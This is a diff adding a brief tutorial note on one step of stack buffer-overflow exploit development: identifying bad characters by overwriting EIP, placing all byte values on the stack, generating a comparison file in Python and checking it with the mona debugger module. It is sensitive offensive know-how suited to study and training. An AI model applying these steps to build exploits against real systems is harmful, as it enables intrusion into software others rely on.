@@ -1,0 +1,15 @@
+1. In step 4, we are sending a payload which fills buffer with A, BBBB in EIP and an array of 256 badchars (00-FF) in the stack (ESP points towards this)
+
+2. On the debug machine, we can generate a file which contains the same list of badchars with the help of python:
+   badchar_test = ""
+   badchars = [0x00, 0x0A, 0xAD]
+   for i in range(0x00, 0xFF+1):
+   	  if i not in badchars:
+        badchar_test += chr(i)
+   with open("badchar_test.bin", "wb") as f:
+      f.write(badchar_test)
+
+3. Now, we can compare the contents of stack pointed by esp and the file using mona module:
+   !mona compare -a esp -f C:\Python27\badchar_test.bin
+
+This gives us the list of badchars to avoid.
